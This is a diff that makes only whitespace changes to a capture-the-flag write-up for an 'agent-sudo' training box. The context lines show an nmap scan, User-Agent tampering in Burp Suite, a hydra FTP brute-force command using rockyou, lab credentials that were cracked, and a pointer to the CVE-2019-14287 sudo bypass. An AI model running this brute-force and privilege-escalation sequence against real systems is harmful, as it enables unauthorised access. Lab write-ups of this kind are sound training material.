@@ -20,13 +20,13 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Annoucement
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
 ```
 
 
 ## Foothold:
 
 burpsuite
+
 intercept -> send to repeater > try User-Agent: A,B,C,...
 ```
 GET /agent_C_attention.php HTTP/1.1
@@ -66,6 +66,7 @@ $ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.255.156 ftp
 ```
 
 Loot:
+
 chris:crystal
 
 ftp
@@ -82,7 +83,6 @@ All these alien like photos are fake! Agent R stored the real picture inside you
 
 From,
 Agent C
-
 ```
 
 get cutie.png 
@@ -100,7 +100,6 @@ We need to send the picture to 'QXJlYTUx' as soon as possible!
 
 By,
 Agent R
-
 ```
 
 ```bash
@@ -120,10 +119,10 @@ Don't ask me why the password look cheesy, ask agent R who set this password for
 
 Your buddy,
 chris
-
 ```
 
 Loot:
+
 james:hackerrules!
 
 
@@ -142,6 +141,7 @@ $ cat user.txt
 ```
 
 google dorking
+
 site:foxnews.com roswell
 
 
@@ -158,6 +158,7 @@ Sorry, user james is not allowed to execute '/bin/bash' as root on agent-sudo.
 ```
 
 CVE-2019-14287
+
 [Exploit Link](https://www.exploit-db.com/exploits/47502)
 
 ```bash
